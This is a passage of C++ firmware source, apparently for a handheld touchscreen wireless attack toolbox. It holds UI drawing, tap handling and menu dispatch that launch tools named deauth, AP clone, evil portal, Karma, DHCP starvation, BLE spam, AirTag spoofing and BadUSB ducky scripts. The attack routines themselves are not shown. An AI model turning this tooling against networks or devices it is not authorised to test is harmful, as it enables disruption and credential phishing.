    t.drawRoundRect(menuX + 1, menuY + 1, menuW - 2, menuH - 2, 9, Theme::PURPLE);

    // Title: target name
    t.setTextColor(Theme::VAPOR_PINK, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    char title[40];
    if (s_contextType == ContextType::BLE && s_contextTarget >= 0 && s_contextTarget < s_bleCount) {
        snprintf(title, sizeof title, ">> %s <<", s_bleResults[s_contextTarget].name);
    } else if (s_contextTarget >= 0 && s_contextTarget < s_scanCount) {
        snprintf(title, sizeof title, ">> %s <<", s_scanResults[s_contextTarget].ssid);
    } else {
        strcpy(title, ">> ??? <<");
    }
    t.drawString(title, w / 2, menuY + 18, 2);

    // Menu rows
    int rowTop = menuY + 40;
    for (int i = 0; i < count; i++) {
        int ry = rowTop + i * rowH;
        bool isCancel = (i == count - 1);
        uint16_t bg = isCancel ? Theme::BG : Theme::TASKBAR;
        uint16_t fg = isCancel ? Theme::AMBER : Theme::CYAN;

        t.fillRoundRect(menuX + 8, ry, menuW - 16, rowH - 4, 5, bg);
        t.setTextColor(fg, bg);
        t.setTextDatum(MC_DATUM);
        t.drawString(labels[i], w / 2, ry + rowH / 2 - 2, 2);
    }
}

static bool handleContextTap(TFT_eSPI& t, int16_t x, int16_t y) {
    const int w = t.width();
    const int h = t.height();
    const int menuW = w - 40;
    const int rowH = 38;
    int count = (s_contextType == ContextType::BLE) ? BLE_CTX_COUNT : WIFI_CTX_COUNT;
    const int menuH = count * rowH + 50;
    const int menuX = 20;
    const int menuY = (h - menuH) / 2;

    if (x < menuX || x > menuX + menuW || y < menuY || y > menuY + menuH) {
        s_contextMenuOpen = false;
        return true;
    }

    int rowTop = menuY + 40;
    int row = (y - rowTop) / rowH;
    if (row < 0 || row >= count) { s_contextMenuOpen = false; return true; }

    s_contextMenuOpen = false;
    if (row == count - 1) return true;  // CANCEL

    int target = s_contextTarget;

    if (s_contextType == ContextType::WIFI) {
        if (target < 0 || target >= s_scanCount) return true;
        switch (row) {
            case 0:  // DEAUTH
                deauthStart(target);
                launchTool(ActiveTool::DEAUTH);
                break;
            case 1:  // CLONE THIS AP
                cloneApStart(target);
                launchTool(ActiveTool::CLONE_AP);
                break;
            default:
                Serial.printf("[toolbox] %s on %s — not yet implemented\n",
                              WIFI_CTX_LABELS[row], s_scanResults[target].ssid);
                break;
        }
    } else if (s_contextType == ContextType::BLE) {
        if (target < 0 || target >= s_bleCount) return true;
        switch (row) {
            case 0:  // TRACK SIGNAL
                bleTrackStart(target);
                s_activeTool = ActiveTool::BLE_TRACK;
                s_toolActive = true;
                s_toolStartMs = millis();
                s_level = ToolboxLevel::TOOL_RUNNING;
                break;
            case 1:  // ENUMERATE SERVICES
                Serial.printf("[toolbox] Enumerate: %s\n", s_bleResults[target].addr);
                // TODO: connect and discover GATT services
                break;
        }
    }
    return true;
}

// =============================================================================
//  Public API
// =============================================================================
void uiToolboxInit(TFT_eSPI& t) {
    s_level = ToolboxLevel::CATEGORIES;
    s_scroll = 0;
    s_selected = -1;
    s_toolActive = false;
    s_contextMenuOpen = false;
    s_activeTool = ActiveTool::NONE;
    s_toolScroll = 0;
}

void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    t.fillRect(0, 0, w, h, Theme::BG);

    // Header
    t.fillRect(0, 0, w, HEADER_H, Theme::TASKBAR);
    t.setTextColor(Theme::VAPOR_PINK, Theme::TASKBAR);
    t.setTextSize(1);
    t.setTextDatum(MC_DATUM);
    t.drawString(headerForLevel(s_level), w / 2, HEADER_H / 2, 4);

    if (s_contextMenuOpen) {
        // Draw the scan underneath (dimmed), then the context menu on top
        if (s_activeTool == ActiveTool::WIFI_SCAN) drawWifiScan(t, now);
        drawContextMenu(t);
        return;
    }

    if (s_level == ToolboxLevel::TOOL_RUNNING) {
        switch (s_activeTool) {
            case ActiveTool::WIFI_SCAN:   drawWifiScan(t, now);   break;
            case ActiveTool::DEAUTH:      drawDeauth(t, now);     break;
            case ActiveTool::BEACON_SPAM: drawBeaconSpam(t, now); break;
            case ActiveTool::RICKROLL:    drawRickroll(t, now);   break;
            case ActiveTool::CLONE_AP:    drawCloneAp(t, now);    break;
            case ActiveTool::EVIL_PORTAL: drawEvilPortal(t, now); break;
            case ActiveTool::KARMA:       drawKarma(t, now);      break;
            case ActiveTool::DHCP_STARVE: drawDhcpStarve(t, now); break;
            case ActiveTool::PROBE_SNIFF: drawProbeSniff(t, now); break;
            case ActiveTool::BLE_SCAN:    drawBleScan(t, now);    break;
            case ActiveTool::APPLE_SPAM:    drawAppleSpam(t, now);      break;
            case ActiveTool::SAMSUNG_SPAM:  drawSamsungSpam(t, now);    break;
            case ActiveTool::SWIFTPAIR_SPAM: drawSwiftPairSpam(t, now); break;
            case ActiveTool::BLE_TRACK:      drawBleTrack(t, now);      break;
            case ActiveTool::FLIPPER_DETECT: drawFlipperDetect(t, now); break;
            case ActiveTool::AIRTAG_SPOOF:   drawAirtagSpoof(t, now);   break;
            case ActiveTool::HAYSTACK:       drawHaystack(t, now);      break;
            case ActiveTool::BADUSB_DUCKY:   drawBadUsb(t, now);        break;
            case ActiveTool::USB_KEYBOARD:   drawUsbKeyboard(t, now);   break;
            case ActiveTool::PCAP_CAPTURE:   drawPcapCapture(t, now);   break;
            case ActiveTool::WIFI_LOGGER:    drawWifiLogger(t, now);    break;
            case ActiveTool::SD_BROWSER:     drawSdBrowser(t, now);     break;
            default:
                t.setTextColor(Theme::CYAN, Theme::BG);
                t.setTextDatum(MC_DATUM);
                t.drawString("Not yet implemented", w / 2, h / 2, 4);
                t.drawString("TAP TO STOP", w / 2, h / 2 + 30, 2);
                break;
        }
        return;
    }

    drawMenuRows(t);
}

void uiToolboxScroll(int delta) {
    if (s_level == ToolboxLevel::TOOL_RUNNING) {
        s_toolScroll += delta;
        if (s_toolScroll < 0) s_toolScroll = 0;
        return;
    }
    int count = 0;
    labelsForLevel(s_level, count);
    s_scroll += delta;
    if (s_scroll < 0) s_scroll = 0;
    if (s_scroll > count - 3) s_scroll = count - 3;
    if (s_scroll < 0) s_scroll = 0;
}

static void handleCategoryTap(int idx) {
    switch ((ToolCategory)idx) {
        case ToolCategory::WIFI: s_level = ToolboxLevel::WIFI_TOOLS; s_scroll = 0; break;
        case ToolCategory::BLE:  s_level = ToolboxLevel::BLE_TOOLS;  s_scroll = 0; break;
        case ToolCategory::USB:  s_level = ToolboxLevel::USB_TOOLS;  s_scroll = 0; break;
        case ToolCategory::UTIL: s_level = ToolboxLevel::UTIL_TOOLS; s_scroll = 0; break;
        case ToolCategory::BACK: break;
        default: break;
    }
}

static bool handleWifiTap(int idx) {
    if ((WifiTool)idx == WifiTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
    switch ((WifiTool)idx) {
        case WifiTool::SCAN_NETWORKS: launchTool(ActiveTool::WIFI_SCAN); break;
        case WifiTool::DEAUTH:
            // Need a target — run a scan first, then pick
            if (s_scanCount == 0) {
                launchTool(ActiveTool::WIFI_SCAN);  // scan first, user can deauth from scan
            } else {
                // Use first found network as default target (TODO: selection UI)
                s_scanSelected = 0;
                deauthStart(0);
                launchTool(ActiveTool::DEAUTH);
            }
            break;
        case WifiTool::BEACON_SPAM:   launchTool(ActiveTool::BEACON_SPAM); break;
        case WifiTool::RICKROLL:       launchTool(ActiveTool::RICKROLL); break;
        case WifiTool::EVIL_PORTAL:    launchTool(ActiveTool::EVIL_PORTAL); break;
        case WifiTool::PROBE_SNIFF:    launchTool(ActiveTool::PROBE_SNIFF); break;
        case WifiTool::KARMA:          launchTool(ActiveTool::KARMA); break;
        case WifiTool::DHCP_STARVE:    launchTool(ActiveTool::DHCP_STARVE); break;
        case WifiTool::PCAP_CAPTURE:   launchTool(ActiveTool::PCAP_CAPTURE); break;
        case WifiTool::AP_CLONE:       // Clone from menu needs scan first
            if (s_scanCount > 0) { cloneApStart(0); launchTool(ActiveTool::CLONE_AP); }
            else launchTool(ActiveTool::WIFI_SCAN);
            break;
        default:
            s_toolActive = true;
            s_activeTool = ActiveTool::NONE;
            s_level = ToolboxLevel::TOOL_RUNNING;
            break;
    }
    return true;
}

static bool handleBleTap(int idx) {
    if ((BleTool)idx == BleTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
    switch ((BleTool)idx) {
        case BleTool::SCAN_DEVICES: launchTool(ActiveTool::BLE_SCAN); break;
        case BleTool::APPLE_SPAM:     launchTool(ActiveTool::APPLE_SPAM); break;
        case BleTool::SAMSUNG_SPAM:   launchTool(ActiveTool::SAMSUNG_SPAM); break;
        case BleTool::SWIFTPAIR_SPAM: launchTool(ActiveTool::SWIFTPAIR_SPAM); break;
        case BleTool::FLIPPER_DETECT: launchTool(ActiveTool::FLIPPER_DETECT); break;
        case BleTool::AIRTAG_SPOOF:  launchTool(ActiveTool::AIRTAG_SPOOF); break;
        case BleTool::HAYSTACK:      launchTool(ActiveTool::HAYSTACK); break;
        default:
            s_toolActive = true;
            s_activeTool = ActiveTool::NONE;
            s_level = ToolboxLevel::TOOL_RUNNING;
            break;
    }
    return true;
}

static bool handleUsbTap(int idx) {
    if ((UsbTool)idx == UsbTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
    switch ((UsbTool)idx) {
        case UsbTool::DUCKY_SCRIPT: launchTool(ActiveTool::BADUSB_DUCKY); break;
        case UsbTool::USB_KEYBOARD: launchTool(ActiveTool::USB_KEYBOARD); break;
        default:
            s_toolActive = true;
            s_activeTool = ActiveTool::NONE;
            s_level = ToolboxLevel::TOOL_RUNNING;
            break;
    }
    return true;
}

static bool handleUtilTap(int idx) {
    if ((UtilTool)idx == UtilTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
    switch ((UtilTool)idx) {
        case UtilTool::SD_BROWSER:    launchTool(ActiveTool::SD_BROWSER); break;
        case UtilTool::WIFI_LOGGER:   launchTool(ActiveTool::WIFI_LOGGER); break;
        default:
            s_toolActive = true;
            s_activeTool = ActiveTool::NONE;
            s_level = ToolboxLevel::TOOL_RUNNING;
            break;
    }
    return true;
}

bool uiToolboxHandleTap(TFT_eSPI& t, int16_t x, int16_t y, uint32_t now) {
    // If long press already fired this gesture, eat the tap
    if (s_longPressFired) return true;

    // Context menu is open — handle its taps
    if (s_contextMenuOpen) return handleContextTap(t, x, y);

    if (s_level == ToolboxLevel::TOOL_RUNNING) {
        const int hh = t.height();
        const bool tapBottom = (y > hh - 30);
        const bool tapHeader = (y < HEADER_H + 22);  // header + status line

        // WiFi scan
        if (s_activeTool == ActiveTool::WIFI_SCAN) {
            if (tapBottom) {
                stopActiveTool();
                s_level = ToolboxLevel::WIFI_TOOLS;
                s_scroll = 0;
            } else if (tapHeader && !s_scanning) {
                wifiScanStart();  // rescan only from header tap
            } else if (!tapHeader && s_scanCount > 0) {
                // Tap on a result row = select it
                int listTop = HEADER_H + 22;
                int row = (y - listTop) / (RESULT_H + RESULT_PAD) + s_toolScroll;
                if (row >= 0 && row < s_scanCount) {
                    s_scanSelected = row;
                    Serial.printf("[toolbox] selected network: %s\n", s_scanResults[row].ssid);
                }
            }
            return true;
        }
        // BLE scan
        if (s_activeTool == ActiveTool::BLE_SCAN) {
            if (tapBottom) {
                stopActiveTool();
                s_level = ToolboxLevel::BLE_TOOLS;
                s_scroll = 0;
            } else if (tapHeader && !s_bleScanning) {
                bleScanStart();  // rescan only from header tap
            }
            return true;
        }
        // Everything else: bottom bar stops, other taps ignored
        if (tapBottom) {
            stopActiveTool();
            s_level = ToolboxLevel::CATEGORIES;
            s_scroll = 0;
        }
        return true;
    }

    const int menuTop = HEADER_H + ROW_PAD;
    if (y < menuTop) return true;

    int count = 0;
    labelsForLevel(s_level, count);
    const int row = (y - menuTop) / (ROW_H + ROW_PAD) + s_scroll;
    if (row < 0 || row >= count) return true;
    s_selected = row;

    switch (s_level) {
        case ToolboxLevel::CATEGORIES:
            if ((ToolCategory)row == ToolCategory::BACK) return false;
            handleCategoryTap(row);
            return true;
        case ToolboxLevel::WIFI_TOOLS: return handleWifiTap(row);
        case ToolboxLevel::BLE_TOOLS:  return handleBleTap(row);
        case ToolboxLevel::USB_TOOLS:  return handleUsbTap(row);
        case ToolboxLevel::UTIL_TOOLS: return handleUtilTap(row);
        default: return true;
    }
}

bool uiToolboxToolRunning() { return s_toolActive; }

void uiToolboxStopTool() {
    stopActiveTool();
    s_level = ToolboxLevel::CATEGORIES;
    s_scroll = 0;
    s_selected = -1;
}
